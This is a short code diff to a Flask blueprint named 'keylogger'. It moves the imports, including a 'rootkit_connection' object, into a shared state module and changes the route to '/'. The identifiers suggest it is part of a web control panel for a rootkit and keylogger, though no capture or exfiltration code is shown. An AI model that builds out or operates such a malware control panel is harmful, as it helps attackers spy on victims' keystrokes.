@@ -1,11 +1,9 @@
 from flask import Blueprint, render_template, redirect, url_for
-from utils.tools import authenticated, rootkit_connection, connection_lock
-from config import BUFFER_SIZE
+from utils.state import authenticated, rootkit_connection, connection_lock, BUFFER_SIZE
 
 keylogger_bp = Blueprint('keylogger', __name__)
 
-
-@keylogger_bp.route('/keylogger')
+@keylogger_bp.route('/')
 def keylogger():
     if not authenticated:
         return redirect(url_for('auth.login'))
